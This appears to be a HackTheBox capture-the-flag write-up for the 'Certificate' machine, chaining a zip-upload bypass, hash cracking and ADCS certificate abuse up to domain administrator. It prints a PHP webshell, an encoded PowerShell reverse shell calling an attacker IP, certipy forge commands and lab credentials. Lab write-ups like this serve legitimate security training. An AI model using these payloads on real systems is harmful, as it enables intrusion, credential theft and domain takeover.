---
title: Certificate
categories: [HackTheBox]
tags: [windows, adcs, kerberos, zip, php, mysql, passwordcracking]
media_subpath: /images/hackthebox_certificate/
image:
  path: 'https://labs.hackthebox.com/storage/avatars/9b765f2f3e0b0c8d115b5455c22101cf.png'
---

## Summary
**Certificate** is a Hard-rated HackTheBox machine that demonstrates a complex attack chain involving web application vulnerabilities, Active Directory Certificate Services (ADCS) exploitation, and privilege escalation. The attack begins with exploiting an evasive concatenated zip upload vulnerability in a PHP web application to gain initial access. After compromising the web server and extracting database credentials, we crack user passwords and gain access to a Windows domain environment. Through analysis of network traffic captures, we extract Kerberos hashes and exploit ADCS vulnerabilities to forge certificates, ultimately achieving domain administrator access through a golden certificate attack.

## Nmap Scan

We start our enumeration of the given IP Address by running an `nmap` scan

```shell
nmap -sVC -Pn -oN nmap -vv 10.10.11.XX
```
> Command breakdown:
- `nmap` : This command is used to run the nmap tool.
- `-sVC` : This flag is the combination of the `-sV` and `-sC` flags, which specifies that we want to run a service version scan and a script scan, respectively.
- `-Pn` : Treat all hosts as online
- `-oN` : Output to a file in normal nmap format
- `-vv` : Very verbose output
{: .prompt-info}

### Relevant Ports

```bash
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-08-07 00:39:45Z)
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
```

> Key services identified:
- **Port 80 (HTTP)**: Apache HTTP server running PHP, likely hosting a web application.
- **Port 88 (Kerberos)**: Indicates the presence of a Kerberos authentication service, suggesting an Active Directory environment.
- **Port 389 (LDAP)**: LDAP service for directory services, commonly used in Active Directory.
- **Port 445 (Microsoft-DS)**: SMB service, often used for file sharing and domain services.
- **Port 5985 (HTTP)**: WinRM service, which can be used for remote management of Windows machines.
{: .prompt-tip}

## 80 - Web Application

Looking at the web server, we can see a login and registration page for what appears to be a certificate management system.

![Web Login](file-20250806163655574.png)

When registering, we can register as a student or teacher if we have a code. We register as a student since we don't have a teacher code.

![Registration](file-20250806163742356.png)

Looking at the quizzes section, we can upload assignments as PDF, DOCX, PPTX, or XLSX files, and we can upload as a ZIP to reduce file size.

![Upload Interface](file-20250806163843322.png)

### Evasive Concatenated Zip Vulnerability

Researching file upload vulnerabilities, we found information about [evasive concatenated zip attacks](https://web.archive.org/web/20250321164047/https://perception-point.io/blog/evasive-concatenated-zip-trojan-targets-windows-users/). This technique allows us to concatenate two files in one to evade virus scanning and upload malicious PHP files to get a web shell.

> The evasive concatenated zip technique works by creating a ZIP file that contains both a legitimate file (like a PDF) and a malicious file (like a PHP webshell). The antivirus scanner may only examine the first file in the archive, allowing the malicious file to bypass detection.
{: .prompt-info}

We create a malicious PHP webshell and concatenate it with a legitimate file to create our payload:

```php
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

After uploading our evasive concatenated zip file, we can access our webshell and confirm we have code execution as the `xamppuser`.

![Webshell Test](file-20250806171236812.png)

And then we generate a powershell reverse shell payload from `nishang` and run it to get a shell.
![Webshell Confirmation](file-20250806171659624.png)

### Initial Shell Access

Running our reverse shell command:

```bash
powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4AMQA0ACcALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA=
```

![Reverse Shell](file-20250806171708043.png)

Running this command gives us a shell on the box.

## Database Enumeration

Looking at the configuration files, we find credentials for the MySQL database and can dump the database contents.

```sql
PS C:\xampp\mysql\bin> .\mysql.exe -u certificate_webapp_user -p'cert!f!c@teDBPWD' -e 'show tables;' Certificate_WEBAPP_DB
Tables_in_certificate_webapp_db
course_sessions
courses
users
users_courses
```

```sql
PS C:\xampp\mysql\bin> .\mysql.exe -u certificate_webapp_user -p'cert!f!c@teDBPWD' -e 'describe users;' Certificate_WEBAPP_DB
Field   Type    Null    Key     Default Extra
id      int(11) NO   PRI     NULL    auto_increment
first_name      varchar(50)     NO              NULL
last_name       varchar(50)     NO              NULL
username        varchar(50)     NO      UNI     NULL
email   varchar(50)     NO      UNI     NULL
password        varchar(255)    NO              NULL
created_at      timestamp       YES             current_timestamp()
role    enum('student','teacher','admin')       YES             NULL
is_active       tinyint(1)      NO              1
```

```sql
PS C:\xampp\mysql\bin> .\mysql.exe -u certificate_webapp_user -p'cert!f!c@teDBPWD' -e 'select username,email,password from users;' Certificate_WEBAPP_DB
username        email   password
Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG
Sara1200        sara1200@gmail.com      $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK
Johney  johny009@mail.com       $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq
havokww havokww@hotmail.com     $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti
stev    steven@yahoo.com        $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2
sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6
railoca railoca@railoca.com     $2y$04$eNajVteBwSFyo5yYgY49puYGvaFT3jheSk7MFjZ13VJCCGxQcfV6W
```

> Command breakdown:
- `mysql.exe` : MySQL command line client
- `-u certificate_webapp_user` : Username for database connection
- `-p'cert!f!c@teDBPWD'` : Password for database connection
- `-e 'show tables;'` : Execute the SQL command to show tables
- `Certificate_WEBAPP_DB` : Database name
{: .prompt-info}

### Password Cracking

From the extracted hashes, we can crack the `sara.b` password using `hashcat`:

![Hash Cracking](file-20250806175223438.png)

![Password Cracked](file-20250806175332454.png)

With the cracked password, we can connect as `sara.b` via WinRM.

![WinRM Access](file-20250806175449028.png)

## Network Traffic Analysis

In the Documents folder, we find a PCAP file that contains network traffic.

![PCAP File](file-20250806175743940.png)

Looking at the protocols in the PCAP, we can see NetBIOS and Kerberos protocols are present.

![Protocol Analysis](file-20250806181059938.png)

### Kerberos Hash Extraction

Looking at the Kerberos requests, we can extract AS-REQ, AS-REP, and TGS-REP hashes using the [Krb5RoastParser](https://github.com/jalvarezz13/Krb5RoastParser) tool.

![Krb5RoastParser](file-20250806181122679.png)

![Hash Extraction](file-20250806201307707.png)

### Manual Hash Construction

For AS-REP hashcat pre-authentication, we use the following template:

```
Hash mode #19900
  Name................: Kerberos 5, etype 18, Pre-Auth
  Category............: Network Protocol
  Slow.Hash...........: Yes
  Deprecated..........: No
  Deprecated.Notice...: N/A
  Password.Type.......: plain
  Password.Len.Min....: 0
  Password.Len.Max....: 256
  Salt.Type...........: Embedded
  Salt.Len.Min........: 0
  Salt.Len.Max........: 256
  Kernel.Type(s)......: pure
  Example.Hash.Format.: plain
  Example.Hash........: $krb5pa$18$hashcat$HASHCATDOMAIN.COM$96c289009b05181bfd32062962740b1b1ce5f74eb12e0266cde74e81094661addab08c0c1a178882c91a0ed89ae4e0e68d2820b9cce69770
  Example.Pass........: hashcat
  Benchmark.Mask......: ?a?a?a?a?a?a?a
  Autodetect.Enabled..: Yes
  Self.Test.Enabled...: Yes
  Potfile.Enabled.....: Yes
  Keep.Guessing.......: No
  Custom.Plugin.......: No
  Plaintext.Encoding..: ASCII, HEX
```

We capture the cipher from the AS-REP response:

![Cipher Capture](file-20250806202046450.png)

We can get the user/domain information from the AS-REP response:

![User Domain Info](file-20250806202133393.png)

We then build the hash in the format:

```
$krb5pa$18$user$DOMAIN.COM$CIPHER
$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
```

And crack it with `hashcat`:

![Hashcat Cracking](file-20250806202754905.png)

## Active Directory Certificate Services (ADCS) Exploitation

Using `certipy`, we gather ADCS information and identify certificate templates:

```bash
certipy find -target $FQDN -dc-ip $IP -u $USERAD -p $PASS -stdout -enabled -hide-admins
```
> Command breakdown:
- `certipy find` : Command to find certificate templates
- `-target $FQDN` : Target the specified fully qualified domain name
- `-dc-ip $IP` : Specify the domain controller IP address
- `-u $USERAD` : Username for authentication
- `-p $PASS` : Password for authentication
- `-stdout` : Output results to standard output
- `-enabled` : Only show enabled templates
- `-hide-admins` : Hide templates that require admin privileges
{: .prompt-info}

![ADCS Enumeration](file-20250806205816039.png)

### ESC3 Attack

From `lion.sk`, we can perform an ESC3 attack to request certificates on behalf of other users:

![ESC3 Attack](file-20250806210350228.png)

```bash
certipy req \
    -u "$USERAD@$DOMAIN" -p $PASS \
    -dc-ip $IP -target $FQDN \
    -ca Certificate-LTD-CA -template Delegated-CRA
```

```bash
certipy req \
    -u "$USERAD@$DOMAIN" -p $PASS \
    -dc-ip $IP -target $FQDN \
    -ca 'Certificate-LTD-CA' -template 'SignedUser' \
    -pfx lion.sk.pfx -on-behalf-of 'CERTIFICATE\ryan.k'
```

```bash
certipy auth -pfx ryan.k.pfx -dc-ip $IP
```

## Privilege Escalation

Logging in as `ryan.k`, we discover we have `SeManageVolumePrivilege`. Using the [SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit), we can make the C: directory controlled by users.

![SeManageVolume Exploit](file-20250806211203398.png)

![Directory Control](file-20250806211407329.png)

## Golden Certificate Attack

With this permission, we can extract the CA keys and forge certificates for any user in the domain.

### Extracting CA Certificate

```powershell
certutil -store my
```

```powershell
certutil -exportpfx My "2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8" .\ca.pfx
```

### Forging Administrator Certificate

```bash
certipy forge \
    -ca-pfx ca.pfx  -upn 'administrator@certificate.htb' \
    -sid 'S-1-5-21-515537669-4223687196-3249690583-500'
```

```bash
certipy auth -pfx administrator_forged.pfx -dc-ip $IP
```

Finally, we can login as administrator with WinRM:

![Administrator Access](file-20250806212352228.png)

## Conclusion

### Quick Recap
- The machine was compromised through an evasive concatenated zip upload vulnerability in a PHP web application
- Database credentials were extracted and used to crack user passwords
- Network traffic analysis revealed Kerberos hashes that were cracked to gain domain access
- ADCS vulnerabilities were exploited to forge certificates and escalate to domain administrator
- The `SeManageVolumePrivilege` was abused to extract CA keys and forge golden certificates

### Lessons Learned
- Always check for file upload vulnerabilities, especially with zip files
- Network traffic captures can contain valuable authentication data
- ADCS misconfigurations can lead to complete domain compromise
- Privilege escalation through certificate forging is a powerful attack vector
- Understanding Active Directory Certificate Services is crucial for red team assessments
